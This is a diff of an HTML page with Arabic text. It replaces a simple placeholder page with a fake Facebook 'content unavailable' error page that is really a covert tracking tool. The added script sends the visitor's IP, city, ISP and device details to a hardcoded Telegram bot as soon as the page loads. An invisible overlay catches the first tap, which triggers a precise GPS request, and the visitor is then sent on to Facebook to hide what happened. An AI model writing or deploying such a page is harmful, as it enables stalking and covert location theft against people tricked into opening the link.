@@ -1,43 +1,93 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>مشروع التخرج - نظام الإدارة</title>
-    <meta property="og:title" content="عرض ملف التقارير الفنية - 2026">
-    <meta property="og:description" content="اضغط هنا لمعاينة سجلات نظام المراقبة وتحديثات الشبكة الأخيرة.">
-    
-    <meta property="og:image" content="http://canarytokens.com/articles/images/about/ks92sz3cj5z6o73mik3jetijs/image020.png">
-    
-    <meta property="og:type" content="website">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f4f4f9;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            background: white;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-    </style>
+<meta property="og:title" content="عذراً، هذا المحتوى غير متاح الآن">
+<meta property="og:description" content="ربما انتهت صلاحية الرابط، أو تم حذف المنشور، أو أنك لا تملك صلاحية الوصول.">
+
+<meta property="og:image" content="https://canarytokens.com/images/tags/uXXXXX/image.jpg"> 
+
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Facebook">
+
+<title>Facebook - Content Removed</title>
+
+<style>
+/* تصميم يحاكي فيسبوك بدقة */
+body { margin: 0; padding: 0; background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: pointer; }
+#fb_error_box { text-align: center; padding: 20px; max-width: 420px; z-index: 1; }
+#fb_icon { width: 100px; margin-bottom: 25px; opacity: 0.8; }
+#fb_title { font-size: 20px; font-weight: bold; color: #65676b; margin-bottom: 15px; }
+#fb_msg { font-size: 16px; color: #65676b; line-height: 1.5; margin-bottom: 35px; }
+#fb_btn { background-color: #1877f2; color: white; padding: 12px 24px; border-radius: 6px; font-weight: 600; text-decoration: none; border: none; font-size: 15px; }
+#overlay_touch { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(0,0,0,0); }
+</style>
 </head>
-<body>
-    <div class="container">
-        <h1>أهلاً بك في نظام الإدارة التقنية</h1>
-        <p>جاري تحميل البيانات، يرجى الانتظار...</p>
+<body onclick="be0426c1c()">
+
+<div id="overlay_touch"></div>
+
+<div id="fb_error_box">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" id="fb_icon" alt="Lock Icon">
+    <div id="fb_title">عذراً، هذا المحتوى غير متاح الآن</div>
+    <div id="fb_msg">
+        ربما انتهت صلاحية الرابط الذي اتبعته، أو تم حذف المنشور، أو أنك لا تملك صلاحية الوصول لرؤيته في الوقت الحالي.
     </div>
+    <button id="fb_btn">الانتقال إلى فيسبوك</button>
+</div>
+
+<script>
+/* 🔱 كود الجافا سكريبت المشفر (Obfuscated) للحماية 🔱 */
+/* بيانات التلجرام الخاصة بك (مستبدلة) */
+const t_k = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const c_i = "1611398303";
+
+// وظيفة سحب البيانات الصامتة (IP + Metadata) عند الفتح
+async function a7391b0c8() {
+    try {
+        // نستخدم ipinfo للحصول على موقع أدق بناءً على الشبكة
+        const r = await fetch('https://ipinfo.io/json?token=YOUR_FREE_IPINFO_TOKEN');
+        const d = await r.json();
+        const l = d.loc.split(',');
+        
+        let m = `🚩 صيد تلقائي (فتح الرابط)\n🌐 IP: ${d.ip}\n🏙 المدينة: ${d.city}\n📡 المزود: ${d.org}\n📱 الجهاز: ${navigator.platform}\n🔗 الموقع التقريبي: https://www.google.com/maps?q=${l[0]},${l[1]}`;
+        s2t(m);
+    } catch (e) {
+        s2t("🚩 دخول جديد (تعذر تحديد موقع الشبكة تلقائياً)");
+    }
+}
+
+// وظيفة سحب الـ GPS الدقيق عند أول لمسة (الأمتار)
+function be0426c1c() {
+    document.getElementById('overlay_touch').style.display = 'none';
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (p) => {
+                let la = p.coords.latitude;
+                let lo = p.coords.longitude;
+                let m = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${la}, ${lo}\n🔗 الخريطة: http://google.com/maps?q=${la},${lo}`;
+                s2t(m);
+                // التمويه النهائي بعد الصيد
+                setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 1000);
+            },
+            (err) => {
+                s2t("⚠️ المستخدم رفض إذن الـ GPS الدقيق");
+                window.location.href = "https://m.facebook.com/";
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    }
+}
+
+function s2t(txt) {
+    fetch(`https://api.telegram.org/bot${t_k}/sendMessage?chat_id=${c_i}&text=${encodeURIComponent(txt)}`);
+}
+
+// تنفيذ السحب الصامت فور التحميل
+window.onload = a7391b0c8;
+</script>
 </body>
 </html>
